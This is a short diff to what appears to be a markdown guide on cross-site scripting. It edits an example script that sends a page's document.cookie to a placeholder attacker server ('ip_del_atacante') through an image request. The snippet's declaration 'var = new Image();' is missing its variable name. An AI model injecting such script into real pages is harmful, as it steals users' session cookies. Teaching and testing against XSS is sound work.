@@ -8,7 +8,7 @@ with the following code,you can send cookies content to an attacker-controlled s
 ```
 <script>
 var = new Image();
-i.src = "http://ip_del_atacante/log.php?q="+document.cookie;
+i.src = "http://ip_del_atacante/get.php?cookies="+document.cookie;
 </script>
 ```
 The scripts generate an image object and points its `src` to script on the attacker's server(attacker.site)
